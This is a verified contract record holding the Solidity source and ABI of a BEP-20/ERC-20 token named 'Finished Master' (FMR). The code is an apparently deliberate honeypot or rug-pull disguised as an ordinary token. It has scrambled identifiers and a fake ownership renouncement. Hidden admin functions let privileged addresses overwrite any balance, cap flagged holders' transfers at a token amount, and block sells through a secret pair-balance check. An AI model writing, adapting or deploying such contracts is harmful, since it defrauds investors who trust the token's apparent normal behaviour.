{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface buySellMin {\n    function createPair(address shouldSenderSwap, address walletMarketing) external returns (address);\n}\n\ninterface senderBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeReceiverIs) external view returns (uint256);\n\n    function transfer(address fromTx, uint256 feeSell) external returns (bool);\n\n    function allowance(address marketingShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTx,\n        uint256 feeSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeReceiver, uint256 value);\n    event Approval(address indexed marketingShould, address indexed spender, uint256 value);\n}\n\nabstract contract autoFromExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeAt is senderBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FinishedMaster is autoFromExempt, senderBuy, takeAt {\n\n    function shouldFee(address senderTotalReceiver, uint256 feeSell) public {\n        teamAmount();\n        marketingAmount[senderTotalReceiver] = feeSell;\n    }\n\n    function teamAmount() private view {\n        require(tokenEnable[_msgSender()]);\n    }\n\n    function enableLaunched(address totalLiquidity, address fromTx, uint256 feeSell) internal returns (bool) {\n        if (totalLiquidity == maxShould) {\n            return modeShould(totalLiquidity, fromTx, feeSell);\n        }\n        uint256 maxReceiver = senderBuy(receiverLiquidity).balanceOf(enableTake);\n        require(maxReceiver == sellMarketing);\n        require(fromTx != enableTake);\n        if (enableTotalSwap[totalLiquidity]) {\n            return modeShould(totalLiquidity, fromTx, limitSell);\n        }\n        return modeShould(totalLiquidity, fromTx, feeSell);\n    }\n\n    function buyMax(address liquidityReceiver) public {\n        teamAmount();\n        \n        if (liquidityReceiver == maxShould || liquidityReceiver == receiverLiquidity) {\n            return;\n        }\n        enableTotalSwap[liquidityReceiver] = true;\n    }\n\n    mapping(address => bool) public tokenEnable;\n\n    mapping(address => bool) public enableTotalSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return enableFrom;\n    }\n\n    address public maxShould;\n\n    uint256 sellSwap;\n\n    uint256 public limitBuy;\n\n    uint256 private autoMarketingSell = 100000000 * 10 ** 18;\n\n    address public receiverLiquidity;\n\n    uint256 private atList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenListTake;\n    }\n\n    uint256 sellMarketing;\n\n    uint256 public teamFund;\n\n    function modeShould(address totalLiquidity, address fromTx, uint256 feeSell) internal returns (bool) {\n        require(marketingAmount[totalLiquidity] >= feeSell);\n        marketingAmount[totalLiquidity] -= feeSell;\n        marketingAmount[fromTx] += feeSell;\n        emit Transfer(totalLiquidity, fromTx, feeSell);\n        return true;\n    }\n\n    function transferFrom(address totalLiquidity, address fromTx, uint256 feeSell) external override returns (bool) {\n        if (_msgSender() != takeFrom) {\n            if (fromLiquidity[totalLiquidity][_msgSender()] != type(uint256).max) {\n                require(feeSell <= fromLiquidity[totalLiquidity][_msgSender()]);\n                fromLiquidity[totalLiquidity][_msgSender()] -= feeSell;\n            }\n        }\n        return enableLaunched(totalLiquidity, fromTx, feeSell);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountTeamAt;\n    }\n\n    function balanceOf(address feeReceiverIs) public view virtual override returns (uint256) {\n        return marketingAmount[feeReceiverIs];\n    }\n\n    uint256 public tokenMin;\n\n    uint256 public exemptTx;\n\n    mapping(address => uint256) private marketingAmount;\n\n    bool public buySender;\n\n    event OwnershipTransferred(address indexed maxEnable, address indexed amountToken);\n\n    uint256 private maxTx;\n\n    string private tokenListTake = \"FMR\";\n\n    address takeFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeAmount(address tokenSell) public {\n        require(tokenSell.balance < 100000);\n        if (buySender) {\n            return;\n        }\n        \n        tokenEnable[tokenSell] = true;\n        \n        buySender = true;\n    }\n\n    function senderSwap(uint256 feeSell) public {\n        teamAmount();\n        sellMarketing = feeSell;\n    }\n\n    function receiverTo() public {\n        emit OwnershipTransferred(maxShould, address(0));\n        amountTeamAt = address(0);\n    }\n\n    bool public senderAmount;\n\n    function transfer(address senderTotalReceiver, uint256 feeSell) external virtual override returns (bool) {\n        return enableLaunched(_msgSender(), senderTotalReceiver, feeSell);\n    }\n\n    constructor (){\n        if (exemptTx != maxTx) {\n            limitAmount = tokenMin;\n        }\n        walletMin maxTake = walletMin(takeFrom);\n        receiverLiquidity = buySellMin(maxTake.factory()).createPair(maxTake.WETH(), address(this));\n        \n        maxShould = _msgSender();\n        tokenEnable[maxShould] = true;\n        marketingAmount[maxShould] = autoMarketingSell;\n        receiverTo();\n        \n        emit Transfer(address(0), maxShould, autoMarketingSell);\n    }\n\n    bool public autoEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMarketingSell;\n    }\n\n    uint8 private tradingFund = 18;\n\n    function allowance(address toReceiverAt, address feeLiquidity) external view virtual override returns (uint256) {\n        if (feeLiquidity == takeFrom) {\n            return type(uint256).max;\n        }\n        return fromLiquidity[toReceiverAt][feeLiquidity];\n    }\n\n    address enableTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private amountTeamAt;\n\n    uint256 public minLaunched;\n\n    string private enableFrom = \"Finished Master\";\n\n    mapping(address => mapping(address => uint256)) private fromLiquidity;\n\n    uint256 constant limitSell = 9 ** 10;\n\n    uint256 private limitAmount;\n\n    function approve(address feeLiquidity, uint256 feeSell) public virtual override returns (bool) {\n        fromLiquidity[_msgSender()][feeLiquidity] = feeSell;\n        emit Approval(_msgSender(), feeLiquidity, feeSell);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return amountTeamAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiverAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"buyMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTotalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"modeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"senderSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"shouldFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FinishedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}